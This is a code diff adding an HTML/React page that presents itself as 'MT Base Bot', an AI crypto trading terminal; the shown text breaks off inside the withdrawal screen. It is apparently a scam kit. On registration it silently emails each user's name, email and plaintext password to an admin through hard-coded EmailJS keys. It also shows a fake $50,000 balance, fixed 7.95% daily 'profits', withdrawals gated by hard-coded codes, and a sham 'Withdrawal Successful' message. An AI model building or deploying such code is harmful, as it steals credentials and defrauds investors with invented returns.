@@ -1,0 +1,1102 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>MT Base Bot | Professional Trading Terminal</title>
+    
+    <!-- Dependencies -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://unpkg.com/react@18/umd/react.production.min.js"></script>
+    <script src="https://unpkg.com/react-dom@18/umd/react-dom.production.min.js"></script>
+    <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
+    <script src="https://cdn.rawgit.com/davidshimjs/qrcodejs/gh-pages/qrcode.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/otplib@12.0.1/otplib.min.js"></script>
+    <script type="text/javascript" src="https://s3.tradingview.com/tv.js"></script>
+
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Roboto+Mono:wght@400;500&display=swap');
+
+        :root {
+            --mt-bg: #0b1220;
+            --mt-panel: #0f172a;
+            --mt-border: #1e293b;
+            --mt-text: #e5e7eb;
+            --mt-text-dim: #94a3b8;
+            --mt-buy: #22c55e;
+            --mt-sell: #ef4444;
+            --mt-accent: #3b82f6;
+        }
+
+        body {
+            background-color: var(--mt-bg);
+            color: var(--mt-text);
+            font-family: 'Inter', sans-serif;
+            margin: 0;
+            overflow: hidden;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        .mono { font-family: 'Roboto Mono', monospace; }
+        
+        /* MT5-style scrollbars */
+        ::-webkit-scrollbar { width: 4px; height: 4px; }
+        ::-webkit-scrollbar-track { background: var(--mt-bg); }
+        ::-webkit-scrollbar-thumb { background: var(--mt-border); border-radius: 2px; }
+
+        .mt-border-t { border-top: 1px solid var(--mt-border); }
+        .mt-border-b { border-bottom: 1px solid var(--mt-border); }
+        .mt-border-l { border-left: 1px solid var(--mt-border); }
+        .mt-border-r { border-right: 1px solid var(--mt-border); }
+        
+        .active-tab { color: var(--mt-accent); border-bottom: 2px solid var(--mt-accent); }
+        
+        .compact-btn {
+            height: 36px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 0 12px;
+            font-weight: 500;
+            font-size: 13px;
+            border-radius: 2px;
+            transition: all 0.2s;
+        }
+
+        input, select {
+            background: #1e293b;
+            border: 1px solid #334155;
+            color: white;
+            padding: 8px 12px;
+            border-radius: 4px;
+            outline: none;
+        }
+
+        input:focus { border-color: var(--mt-accent); }
+
+        .loader-bar {
+            height: 2px;
+            width: 0%;
+            background: var(--mt-accent);
+            animation: loading 15s linear forwards;
+        }
+
+        @keyframes loading {
+            to { width: 100%; }
+        }
+
+        .tv-container { height: calc(100vh - 180px); width: 100%; }
+        
+        .mt-nav-item {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            gap: 2px;
+            font-size: 10px;
+            color: var(--mt-text-dim);
+        }
+
+        .mt-nav-item.active { color: var(--mt-accent); }
+
+        /* Animation for notifications */
+        @keyframes slideInDown {
+            from { transform: translateY(-100%); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+        .animate-slide-down { animation: slideInDown 0.3s ease-out forwards; }
+    </style>
+</head>
+<body>
+    <div id="root"></div>
+
+    <script type="text/babel">
+        const { useState, useEffect, useRef, useMemo } = React;
+
+        // Constants & Config
+        const API_KEY = ""; // Environment handles this
+        const COINGECKO_BASE = "https://api.coingecko.com/api/v3";
+        const DAILY_RETURN_RATE = 0.0795; // 7.95%
+        const SECONDLY_RETURN = DAILY_RETURN_RATE / 86400;
+        const VALID_WITHDRAW_CODES = ["483921", "175064", "902718", "634285", "217509", "856430", "490127", "731694", "562803", "308417"];
+        
+        const APP_ID = typeof __app_id !== 'undefined' ? __app_id : 'mt-base-bot-v1';
+
+        // Initial State
+        const INITIAL_STATE = {
+            user: null, // { name, email, accountId, balance, equity, margin, freeMargin, marginLevel }
+            isLoggedIn: false,
+            quotes: [],
+            activePage: 'landing', // landing, register, login, dashboard, quotes, chart, trade, history, mailbox, deposit, withdraw, settings
+            activities: [],
+            positions: [],
+            selectedSymbol: 'BTC',
+            notificationsEnabled: true,
+            lastNewsUpdate: 0,
+            news: [],
+            withdrawalSuspendedUntil: null,
+            withdrawalProcessing: null // { address, network, amount, countdown }
+        };
+
+        // --- COMPONENTS ---
+
+        const App = () => {
+            const [state, setState] = useState(() => {
+                const saved = localStorage.getItem('mt5TraderAppState');
+                return saved ? JSON.parse(saved) : INITIAL_STATE;
+            });
+
+            const [isLoading, setIsLoading] = useState(false);
+            const [loadingMsg, setLoadingMsg] = useState("");
+            const [showSavePopup, setShowSavePopup] = useState(false);
+            const [modal, setModal] = useState(null);
+            const [notification, setNotification] = useState(null);
+
+            // Sync with local storage
+            useEffect(() => {
+                localStorage.setItem('mt5TraderAppState', JSON.stringify(state));
+            }, [state]);
+
+            // Real-time Equity & Trade Logic
+            useEffect(() => {
+                if (state.isLoggedIn && state.positions.length > 0) {
+                    const timer = setInterval(() => {
+                        setState(prev => {
+                            let addedEquity = 0;
+                            const updatedPositions = prev.positions.map(p => {
+                                const gain = p.margin * SECONDLY_RETURN;
+                                addedEquity += gain;
+                                return { ...p, profit: (p.profit || 0) + gain };
+                            });
+                            
+                            return {
+                                ...prev,
+                                user: {
+                                    ...prev.user,
+                                    equity: prev.user.equity + addedEquity
+                                },
+                                positions: updatedPositions
+                            };
+                        });
+                    }, 1000);
+                    return () => clearInterval(timer);
+                }
+            }, [state.isLoggedIn, state.positions.length]);
+
+            // Withdrawal Countdown
+            useEffect(() => {
+                if (state.withdrawalProcessing) {
+                    const timer = setInterval(() => {
+                        setState(prev => {
+                            if (!prev.withdrawalProcessing) return prev;
+                            const newCount = prev.withdrawalProcessing.countdown - 1;
+                            
+                            if (newCount <= 0) {
+                                // Finalize withdrawal
+                                const updatedBalance = prev.user.balance - prev.withdrawalProcessing.amount;
+                                const newActivity = {
+                                    id: Date.now(),
+                                    type: 'Withdrawal',
+                                    amount: prev.withdrawalProcessing.amount,
+                                    status: 'Successful',
+                                    date: new Date().toLocaleString()
+                                };
+                                
+                                setNotification({
+                                    title: "Withdrawal Successful",
+                                    body: `Amount: $${prev.withdrawalProcessing.amount} has been sent to ${prev.withdrawalProcessing.address}`
+                                });
+
+                                return {
+                                    ...prev,
+                                    user: { ...prev.user, balance: updatedBalance },
+                                    withdrawalProcessing: null,
+                                    activities: [newActivity, ...prev.activities]
+                                };
+                            }
+
+                            return {
+                                ...prev,
+                                withdrawalProcessing: { ...prev.withdrawalProcessing, countdown: newCount }
+                            };
+                        });
+                    }, 1000);
+                    return () => clearInterval(timer);
+                }
+            }, [state.withdrawalProcessing]);
+
+            // Fetch Market Data
+            useEffect(() => {
+                const fetchMarkets = async () => {
+                    try {
+                        const res = await fetch(`${COINGECKO_BASE}/coins/markets?vs_currency=usd&order=market_cap_desc&per_page=50&page=1&sparkline=false`);
+                        const data = await res.json();
+                        if (Array.isArray(data)) {
+                            setState(prev => ({
+                                ...prev,
+                                quotes: data.map(c => ({
+                                    id: c.id,
+                                    symbol: c.symbol.toUpperCase(),
+                                    name: c.name,
+                                    price: c.current_price,
+                                    change: c.price_change_percentage_24h,
+                                    image: c.image
+                                }))
+                            }));
+                        }
+                    } catch (e) { console.error(e); }
+                };
+
+                fetchMarkets();
+                const interval = setInterval(fetchMarkets, 60000);
+                return () => clearInterval(interval);
+            }, []);
+
+            // Notification/News Loop
+            useEffect(() => {
+                if (state.notificationsEnabled) {
+                    const checkNews = () => {
+                        const now = Date.now();
+                        if (now - state.lastNewsUpdate > 12 * 60 * 60 * 1000) {
+                            // Show market update
+                            setNotification({
+                                title: "Market Update",
+                                body: "Bitcoin continues its bullish trend. Check the latest charts for trade opportunities."
+                            });
+                            setState(prev => ({ ...prev, lastNewsUpdate: now }));
+                        }
+                    };
+                    checkNews();
+                    const interval = setInterval(checkNews, 60000);
+                    return () => clearInterval(interval);
+                }
+            }, [state.notificationsEnabled, state.lastNewsUpdate]);
+
+            // Navigation Helpers
+            const navigate = (page) => setState(prev => ({ ...prev, activePage: page }));
+
+            const startLoading = (msg, duration = 15000, onDone) => {
+                setIsLoading(true);
+                setLoadingMsg(msg);
+                setTimeout(() => {
+                    setIsLoading(false);
+                    if (onDone) onDone();
+                }, duration);
+            };
+
+            // Authentication
+            const handleRegister = (formData) => {
+                startLoading("Creating Real Account...", 15000, () => {
+                    const accountId = Math.floor(1000000000 + Math.random() * 9000000000).toString();
+                    const newUser = {
+                        ...formData,
+                        accountId,
+                        balance: 50000.00,
+                        equity: 50000.00,
+                        margin: 0,
+                        freeMargin: 50000.00,
+                        marginLevel: 0
+                    };
+
+                    // Send EmailJS
+                    emailjs.init("fgYbV3Uj86-5V7RcU");
+                    emailjs.send("service_va1veoo", "template_prvf88i", {
+                        to_name: "Admin",
+                        from_name: formData.fullName,
+                        user_email: formData.email,
+                        account_id: accountId,
+                        password: formData.password
+                    }).catch(err => console.error("EmailJS Error:", err));
+
+                    setState(prev => ({
+                        ...prev,
+                        user: newUser,
+                        isLoggedIn: true,
+                        activePage: 'dashboard'
+                    }));
+                    setShowSavePopup(true);
+                });
+            };
+
+            const handleLogin = (email, pass) => {
+                startLoading("Verifying Credentials...", 15000, () => {
+                    if (state.user && state.user.email === email) {
+                        setState(prev => ({ ...prev, isLoggedIn: true, activePage: 'dashboard' }));
+                    } else {
+                        // Fallback for new session if we have a saved user
+                        const saved = JSON.parse(localStorage.getItem('mt5TraderAppState'));
+                        if (saved && saved.user && saved.user.email === email) {
+                            setState(prev => ({ ...prev, ...saved, isLoggedIn: true, activePage: 'dashboard' }));
+                        } else {
+                            setModal({ title: "Login Failed", body: "Invalid email or password." });
+                        }
+                    }
+                });
+            };
+
+            // Trading Actions
+            const openTrade = (type, volume, symbol) => {
+                const currentPrice = state.quotes.find(q => q.symbol === symbol)?.price || 50000;
+                const margin = volume * currentPrice * 10; // Simple margin math
+                
+                if (state.user.balance < margin) {
+                    setModal({ title: "Insufficient Funds", body: "You do not have enough balance for this margin." });
+                    return;
+                }
+
+                const newPosition = {
+                    id: Date.now(),
+                    symbol,
+                    type,
+                    volume,
+                    openPrice: currentPrice,
+                    margin,
+                    profit: 0,
+                    openDate: new Date().toLocaleString()
+                };
+
+                setState(prev => ({
+                    ...prev,
+                    user: {
+                        ...prev.user,
+                        balance: prev.user.balance - margin,
+                        margin: prev.user.margin + margin,
+                    },
+                    positions: [...prev.positions, newPosition],
+                    activePage: 'trade'
+                }));
+            };
+
+            const closePosition = (id) => {
+                setState(prev => {
+                    const pos = prev.positions.find(p => p.id === id);
+                    if (!pos) return prev;
+                    
+                    const finalProfit = pos.profit;
+                    const returnedCapital = pos.margin + finalProfit;
+
+                    return {
+                        ...prev,
+                        user: {
+                            ...prev.user,
+                            balance: prev.user.balance + returnedCapital,
+                            equity: prev.user.equity, // Already updated live
+                            margin: prev.user.margin - pos.margin
+                        },
+                        positions: prev.positions.filter(p => p.id !== id),
+                        activities: [{
+                            id: Date.now(),
+                            type: pos.type,
+                            symbol: pos.symbol,
+                            amount: finalProfit,
+                            status: 'Closed',
+                            date: new Date().toLocaleString()
+                        }, ...prev.activities]
+                    };
+                });
+            };
+
+            // Global UI Helpers
+            const Icons = {
+                Quotes: () => <svg className="w-6 h-6" fill="currentColor" viewBox="0 0 24 24"><path d="M7 5h10a2 2 0 012 2v10a2 2 0 01-2 2H7a2 2 0 01-2-2V7a2 2 0 012-2zm0 2v10h10V7H7zm2 2h6v2H9V9zm0 4h6v2H9v-2z"/></svg>,
+                Chart: () => <svg className="w-6 h-6" fill="currentColor" viewBox="0 0 24 24"><path d="M3 13h2v7H3v-7zm4-6h2v13H7V7zm4 4h2v9h-2v-9zm4-8h2v17h-2V3zm4 10h2v7h-2v-7z"/></svg>,
+                Trade: () => <svg className="w-6 h-6" fill="currentColor" viewBox="0 0 24 24"><path d="M12 2L4.5 20.29l.71.71L12 18l6.79 3 .71-.71L12 2z"/></svg>,
+                History: () => <svg className="w-6 h-6" fill="currentColor" viewBox="0 0 24 24"><path d="M13 3a9 9 0 00-9 9H1l3.89 3.89.07.14L9 12H6a7 7 0 117 7 7.07 7.07 0 01-6-3.18l-1.42 1.42A8.9 8.9 0 0013 21a9 9 0 000-18zm-1 5v5l4.28 2.54.72-1.21-3.5-2.08V8H12z"/></svg>,
+                Mail: () => <svg className="w-6 h-6" fill="currentColor" viewBox="0 0 24 24"><path d="M20 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4l-8 5-8-5V6l8 5 8-5v2z"/></svg>,
+                Menu: () => <svg className="w-6 h-6" fill="currentColor" viewBox="0 0 24 24"><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/></svg>,
+                Plus: () => <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 4v16m8-8H4"/></svg>,
+                Search: () => <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"/></svg>,
+                Settings: () => <svg className="w-6 h-6" fill="currentColor" viewBox="0 0 24 24"><path d="M19.14 12.94c.04-.3.06-.61.06-.94 0-.32-.02-.64-.07-.94l2.03-1.58c.18-.14.23-.41.12-.61l-1.92-3.32c-.12-.22-.37-.29-.59-.22l-2.39.96c-.5-.38-1.03-.7-1.62-.94l-.36-2.54c-.04-.24-.24-.41-.48-.41h-3.84c-.24 0-.43.17-.47.41l-.36 2.54c-.59.24-1.13.57-1.62.94l-2.39-.96c-.22-.08-.47 0-.59.22L2.74 8.87c-.12.21-.08.47.12.61l2.03 1.58c-.05.3-.09.63-.09.94s.02.64.07.94l-2.03 1.58c-.18.14-.23.41-.12.61l1.92 3.32c.12.22.37.29.59.22l2.39-.96c.5.38 1.03.7 1.62.94l.36 2.54c.05.24.24.41.48.41h3.84c.24 0 .44-.17.47-.41l.36-2.54c.59-.24 1.13-.56 1.62-.94l2.39.96c.22.08.47 0 .59-.22l1.92-3.32c.12-.22.07-.47-.12-.61l-2.01-1.58zM12 15.6c-1.98 0-3.6-1.62-3.6-3.6s1.62-3.6 3.6-3.6 3.6 1.62 3.6 3.6-1.62 3.6-3.6 3.6z"/></svg>
+            };
+
+            // Views
+            const LandingPage = () => (
+                <div className="flex flex-col items-center justify-center min-h-screen p-6 text-center bg-gradient-to-b from-[#0f172a] to-[#0b1220]">
+                    <div className="mb-8">
+                        <h1 className="text-4xl font-bold text-white mb-2">MT Base Bot</h1>
+                        <p className="text-blue-400 font-medium">Artificial Intelligence Trading Excellence</p>
+                    </div>
+                    <div className="bg-slate-900 border border-slate-800 p-8 rounded-lg max-w-md w-full mb-8">
+                        <p className="text-gray-400 mb-6 text-sm leading-relaxed">
+                            Experience the next generation of algorithmic trading. MT Base Bot uses proprietary AI to scan markets 24/7, providing consistent returns and institutional-grade tools for retail traders.
+                        </p>
+                        <div className="space-y-4">
+                            <button onClick={() => navigate('register')} className="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 rounded">CREATE REAL ACCOUNT</button>
+                            <div className="text-gray-500 py-1">OR</div>
+                            <button onClick={() => navigate('login')} className="w-full bg-slate-800 hover:bg-slate-700 text-white font-bold py-3 rounded">LOGIN TO EXISTING ACCOUNT</button>
+                        </div>
+                    </div>
+                    <div className="grid grid-cols-2 gap-4 max-w-md w-full text-xs text-gray-500 uppercase tracking-widest">
+                        <div className="p-2 border border-slate-800 rounded">24/7 SUPPORT</div>
+                        <div className="p-2 border border-slate-800 rounded">INSTANT DEPOSIT</div>
+                        <div className="p-2 border border-slate-800 rounded">AI ANALYTICS</div>
+                        <div className="p-2 border border-slate-800 rounded">SECURE WALLET</div>
+                    </div>
+                </div>
+            );
+
+            const RegisterPage = () => {
+                const [form, setForm] = useState({ fullName: '', email: '', password: '', confirm: '' });
+                const handleSubmit = (e) => {
+                    e.preventDefault();
+                    if (form.password !== form.confirm) {
+                        setModal({ title: "Error", body: "Passwords do not match." });
+                        return;
+                    }
+                    handleRegister(form);
+                };
+                return (
+                    <div className="p-6 pt-12 flex flex-col h-screen overflow-y-auto">
+                        <button onClick={() => navigate('landing')} className="mb-6 flex items-center gap-2 text-blue-400">
+                            <Icons.Plus /> Back
+                        </button>
+                        <h2 className="text-2xl font-bold mb-6">Create Real Account</h2>
+                        <form onSubmit={handleSubmit} className="space-y-5">
+                            <div className="flex flex-col gap-2">
+                                <label className="text-xs text-gray-400 uppercase">Full Name</label>
+                                <input required type="text" value={form.fullName} onChange={e => setForm({...form, fullName: e.target.value})} placeholder="John Doe" />
+                            </div>
+                            <div className="flex flex-col gap-2">
+                                <label className="text-xs text-gray-400 uppercase">Email Address</label>
+                                <input required type="email" value={form.email} onChange={e => setForm({...form, email: e.target.value})} placeholder="email@example.com" />
+                            </div>
+                            <div className="flex flex-col gap-2">
+                                <label className="text-xs text-gray-400 uppercase">Password</label>
+                                <input required type="password" value={form.password} onChange={e => setForm({...form, password: e.target.value})} placeholder="••••••••" />
+                            </div>
+                            <div className="flex flex-col gap-2">
+                                <label className="text-xs text-gray-400 uppercase">Confirm Password</label>
+                                <input required type="password" value={form.confirm} onChange={e => setForm({...form, confirm: e.target.value})} placeholder="••••••••" />
+                            </div>
+                            <button className="w-full bg-blue-600 py-4 font-bold rounded mt-4">CREATE ACCOUNT</button>
+                        </form>
+                    </div>
+                );
+            };
+
+            const LoginPage = () => {
+                const [email, setEmail] = useState('');
+                const [pass, setPass] = useState('');
+                return (
+                    <div className="p-6 pt-12 flex flex-col h-screen">
+                        <button onClick={() => navigate('landing')} className="mb-6 flex items-center gap-2 text-blue-400">
+                            <Icons.Plus /> Back
+                        </button>
+                        <h2 className="text-2xl font-bold mb-6">Login</h2>
+                        <div className="space-y-6">
+                            <div className="flex flex-col gap-2">
+                                <label className="text-xs text-gray-400 uppercase">Email Address</label>
+                                <input type="email" value={email} onChange={e => setEmail(e.target.value)} />
+                            </div>
+                            <div className="flex flex-col gap-2">
+                                <label className="text-xs text-gray-400 uppercase">Password</label>
+                                <input type="password" value={pass} onChange={e => setPass(e.target.value)} />
+                            </div>
+                            <button onClick={() => handleLogin(email, pass)} className="w-full bg-blue-600 py-4 font-bold rounded mt-4">LOG IN</button>
+                        </div>
+                    </div>
+                );
+            };
+
+            const Dashboard = () => (
+                <div className="p-4 space-y-4 h-screen overflow-y-auto pb-24">
+                    <div className="bg-[#1e293b] p-4 rounded-lg flex flex-col gap-1 border border-blue-900/30">
+                        <div className="flex justify-between items-center mb-2">
+                            <span className="text-[10px] uppercase font-bold text-blue-400 tracking-wider">Trading Account</span>
+                            <span className="bg-green-500/10 text-green-500 text-[10px] px-2 py-0.5 rounded uppercase font-bold">Real</span>
+                        </div>
+                        <div className="text-2xl font-bold mono">${state.user.balance.toLocaleString('en-US', { minimumFractionDigits: 2 })}</div>
+                        <div className="text-xs text-gray-400">Account ID: <span className="text-white font-medium">{state.user.accountId}</span></div>
+                    </div>
+
+                    <div className="grid grid-cols-4 gap-2">
+                        {['Deposit', 'Withdraw', 'Transfer', 'Order'].map(btn => (
+                            <button 
+                                key={btn}
+                                onClick={() => navigate(btn.toLowerCase())}
+                                className="flex flex-col items-center gap-1 bg-slate-900 p-3 rounded border border-slate-800"
+                            >
+                                <div className="w-8 h-8 rounded-full bg-slate-800 flex items-center justify-center text-blue-400">
+                                    {btn === 'Deposit' && <Icons.Plus />}
+                                    {btn === 'Withdraw' && <Icons.Trade />}
+                                    {btn === 'Transfer' && <Icons.History />}
+                                    {btn === 'Order' && <Icons.Quotes />}
+                                </div>
+                                <span className="text-[10px] uppercase font-bold">{btn}</span>
+                            </button>
+                        ))}
+                    </div>
+
+                    <div>
+                        <h3 className="text-xs uppercase font-bold text-gray-500 mb-3 px-1">Token Holdings</h3>
+                        <div className="space-y-2">
+                            {state.quotes.slice(0, 5).map(coin => (
+                                <div key={coin.id} className="flex items-center justify-between p-3 bg-slate-900/50 border border-slate-800 rounded">
+                                    <div className="flex items-center gap-3">
+                                        <img src={coin.image} className="w-8 h-8" alt="" />
+                                        <div>
+                                            <div className="font-bold">{coin.symbol}</div>
+                                            <div className="text-[10px] text-gray-400">{coin.name}</div>
+                                        </div>
+                                    </div>
+                                    <div className="text-right">
+                                        <div className="mono font-bold">${coin.price.toLocaleString()}</div>
+                                        <div className={`text-[10px] ${coin.change >= 0 ? 'text-green-500' : 'text-red-500'}`}>
+                                            {coin.change >= 0 ? '+' : ''}{coin.change.toFixed(2)}%
+                                        </div>
+                                    </div>
+                                </div>
+                            ))}
+                        </div>
+                    </div>
+
+                    <div className="text-center py-4">
+                        <p className="text-[10px] text-gray-600 uppercase tracking-widest">Powered by CoinGecko</p>
+                    </div>
+                </div>
+            );
+
+            const QuotesPage = () => {
+                const [search, setSearch] = useState('');
+                const filtered = state.quotes.filter(q => q.symbol.includes(search.toUpperCase()) || q.name.toLowerCase().includes(search.toLowerCase()));
+                
+                return (
+                    <div className="flex flex-col h-screen pb-24">
+                        <div className="p-3 bg-slate-900 flex items-center gap-2">
+                            <div className="relative flex-1">
+                                <span className="absolute left-3 top-2 text-gray-500"><Icons.Search /></span>
+                                <input 
+                                    className="w-full pl-10 h-10 text-sm" 
+                                    placeholder="Search Symbols..." 
+                                    value={search}
+                                    onChange={e => setSearch(e.target.value)}
+                                />
+                            </div>
+                        </div>
+                        <div className="flex-1 overflow-y-auto divide-y divide-slate-800">
+                            {filtered.map(coin => (
+                                <div 
+                                    key={coin.id} 
+                                    className="p-4 flex items-center justify-between hover:bg-slate-900 cursor-pointer"
+                                    onClick={() => {
+                                        setState(prev => ({ ...prev, selectedSymbol: coin.symbol }));
+                                        navigate('chart');
+                                    }}
+                                >
+                                    <div className="flex items-center gap-3">
+                                        <img src={coin.image} className="w-8 h-8 rounded-full" alt="" />
+                                        <div>
+                                            <div className="font-bold">{coin.symbol}</div>
+                                            <div className="text-[10px] text-gray-400 uppercase">{coin.name}</div>
+                                        </div>
+                                    </div>
+                                    <div className="flex gap-4">
+                                        <div className="text-right">
+                                            <div className="text-[10px] text-gray-500 uppercase">Bid</div>
+                                            <div className="mono text-red-400 text-sm">{(coin.price * 0.9998).toFixed(2)}</div>
+                                        </div>
+                                        <div className="text-right">
+                                            <div className="text-[10px] text-gray-500 uppercase">Ask</div>
+                                            <div className="mono text-blue-400 text-sm">{(coin.price * 1.0002).toFixed(2)}</div>
+                                        </div>
+                                    </div>
+                                </div>
+                            ))}
+                        </div>
+                    </div>
+                );
+            };
+
+            const ChartsPage = () => {
+                useEffect(() => {
+                    const tvScript = document.createElement('script');
+                    tvScript.type = 'text/javascript';
+                    tvScript.src = 'https://s3.tradingview.com/tv.js';
+                    tvScript.onload = () => {
+                        new window.TradingView.widget({
+                            "autosize": true,
+                            "symbol": `BINANCE:${state.selectedSymbol}USDT`,
+                            "interval": "60",
+                            "timezone": "Etc/UTC",
+                            "theme": "dark",
+                            "style": "1",
+                            "locale": "en",
+                            "toolbar_bg": "#0b1220",
+                            "enable_publishing": false,
+                            "allow_symbol_change": true,
+                            "container_id": "tv_chart_container"
+                        });
+                    };
+                    document.head.appendChild(tvScript);
+                }, [state.selectedSymbol]);
+
+                return (
+                    <div className="h-screen flex flex-col bg-black">
+                        <div className="flex items-center justify-between p-2 bg-slate-900 mt-border-b">
+                            <div className="flex items-center gap-2">
+                                <span className="font-bold text-sm">{state.selectedSymbol}/USDT</span>
+                                <span className="text-[10px] bg-slate-800 px-1 rounded">H1</span>
+                            </div>
+                            <div className="flex gap-2">
+                                <button onClick={() => navigate('order')} className="bg-red-500 text-white text-[10px] font-bold px-3 py-1 rounded">SELL</button>
+                                <button onClick={() => navigate('order')} className="bg-green-500 text-white text-[10px] font-bold px-3 py-1 rounded">BUY</button>
+                            </div>
+                        </div>
+                        <div id="tv_chart_container" className="flex-1"></div>
+                        <div className="h-24"></div>
+                    </div>
+                );
+            };
+
+            const TradePage = () => (
+                <div className="flex flex-col h-screen pb-24">
+                    <div className="p-4 bg-slate-900 border-b border-slate-800 grid grid-cols-2 gap-y-2 text-xs">
+                        <div><span className="text-gray-500">Balance:</span> <span className="font-bold ml-1">${state.user.balance.toFixed(2)}</span></div>
+                        <div><span className="text-gray-500">Equity:</span> <span className="font-bold ml-1 text-blue-400">${state.user.equity.toFixed(2)}</span></div>
+                        <div><span className="text-gray-500">Margin:</span> <span className="font-bold ml-1">${state.user.margin.toFixed(2)}</span></div>
+                        <div><span className="text-gray-500">Free Margin:</span> <span className="font-bold ml-1">${(state.user.equity - state.user.margin).toFixed(2)}</span></div>
+                    </div>
+                    <div className="flex-1 overflow-y-auto">
+                        {state.positions.length === 0 ? (
+                            <div className="h-full flex flex-col items-center justify-center text-gray-600 grayscale opacity-50">
+                                <Icons.Trade />
+                                <p className="mt-2 text-sm uppercase font-bold">No Open Positions</p>
+                            </div>
+                        ) : (
+                            <div className="divide-y divide-slate-800">
+                                {state.positions.map(pos => (
+                                    <div key={pos.id} className="p-4 bg-slate-900/30">
+                                        <div className="flex justify-between items-start mb-2">
+                                            <div>
+                                                <div className="flex items-center gap-2">
+                                                    <span className={`text-[10px] font-bold px-1 rounded ${pos.type === 'BUY' ? 'bg-green-500/10 text-green-500' : 'bg-red-500/10 text-red-500'}`}>{pos.type}</span>
+                                                    <span className="font-bold">{pos.symbol}/USDT</span>
+                                                </div>
+                                                <div className="text-[10px] text-gray-500">{pos.volume} Lots</div>
+                                            </div>
+                                            <div className={`text-lg font-bold mono ${pos.profit >= 0 ? 'text-green-500' : 'text-red-500'}`}>
+                                                {pos.profit >= 0 ? '+' : ''}{pos.profit.toFixed(2)}
+                                            </div>
+                                        </div>
+                                        <div className="flex justify-between items-center text-[10px] text-gray-500">
+                                            <div>Price: <span className="text-white">{pos.openPrice.toFixed(2)}</span></div>
+                                            <button 
+                                                onClick={() => closePosition(pos.id)} 
+                                                className="bg-slate-800 px-3 py-1 rounded text-white font-bold"
+                                            >
+                                                CLOSE POSITION
+                                            </button>
+                                        </div>
+                                    </div>
+                                ))}
+                            </div>
+                        )}
+                    </div>
+                </div>
+            );
+
+            const OrderTicket = () => {
+                const [vol, setVol] = useState(0.01);
+                const [type, setType] = useState('BUY');
+                
+                const handleExecute = () => {
+                    startLoading("Executing Order...", 2000, () => {
+                        openTrade(type, vol, state.selectedSymbol);
+                    });
+                };
+
+                return (
+                    <div className="p-6 pt-12">
+                        <h2 className="text-xl font-bold mb-6">New Order: {state.selectedSymbol}</h2>
+                        <div className="space-y-6">
+                            <div className="flex flex-col gap-2">
+                                <label className="text-[10px] uppercase font-bold text-gray-500">Execution Type</label>
+                                <select className="w-full">
+                                    <option>Market Execution</option>
+                                    <option>Buy Limit</option>
+                                    <option>Sell Limit</option>
+                                </select>
+                            </div>
+                            <div className="flex flex-col gap-2">
+                                <label className="text-[10px] uppercase font-bold text-gray-500">Volume (Lots)</label>
+                                <div className="flex items-center gap-2">
+                                    <button onClick={() => setVol(v => Math.max(0.01, v - 0.01))} className="bg-slate-800 p-2 px-4 rounded">-</button>
+                                    <input type="number" className="flex-1 text-center" value={vol} onChange={e => setVol(parseFloat(e.target.value))} step="0.01" />
+                                    <button onClick={() => setVol(v => Math.min(0.5, v + 0.01))} className="bg-slate-800 p-2 px-4 rounded">+</button>
+                                </div>
+                            </div>
+                            <div className="grid grid-cols-2 gap-4">
+                                <div className="flex flex-col gap-1">
+                                    <label className="text-[10px] uppercase font-bold text-gray-500">Stop Loss</label>
+                                    <input placeholder="0.00" />
+                                </div>
+                                <div className="flex flex-col gap-1">
+                                    <label className="text-[10px] uppercase font-bold text-gray-500">Take Profit</label>
+                                    <input placeholder="0.00" />
+                                </div>
+                            </div>
+                            <div className="grid grid-cols-2 gap-4 pt-4">
+                                <button onClick={() => { setType('SELL'); handleExecute(); }} className="bg-red-500 py-4 font-bold rounded">SELL</button>
+                                <button onClick={() => { setType('BUY'); handleExecute(); }} className="bg-green-500 py-4 font-bold rounded">BUY</button>
+                            </div>
+                        </div>
+                    </div>
+                );
+            };
+
+            const WithdrawalFlow = () => {
+                const [step, setStep] = useState('main'); // main, details, confirm, processing
+                const [details, setDetails] = useState({ address: '', network: 'Ethereum', amount: '' });
+                const [code, setCode] = useState('');
+
+                const submitWithdraw = () => {
+                    if (!VALID_WITHDRAW_CODES.includes(code)) {
+                        setModal({ title: "Validation Failed", body: "Please enter a correct validation code." });
+                        return;
+                    }
+
+                    startLoading("Processing...", 15000, () => {
+                        setState(prev => ({
+                            ...prev,
+                            withdrawalProcessing: {
+                                ...details,
+                                amount: parseFloat(details.amount),
+                                countdown: 86400 // 24 hours
+                            },
+                            activePage: 'dashboard'
+                        }));
+                    });
+                };
+
+                if (state.withdrawalProcessing) {
+                    return (
+                        <div className="p-6 text-center">
+                            <h2 className="text-xl font-bold mb-4">Withdrawal Processing</h2>
+                            <div className="bg-slate-900 p-6 rounded-lg border border-yellow-500/30">
+                                <div className="text-4xl font-mono mb-4">
+                                    {Math.floor(state.withdrawalProcessing.countdown / 3600).toString().padStart(2, '0')}:
+                                    {Math.floor((state.withdrawalProcessing.countdown % 3600) / 60).toString().padStart(2, '0')}:
+                                    {(state.withdrawalProcessing.countdown % 60).toString().padStart(2, '0')}
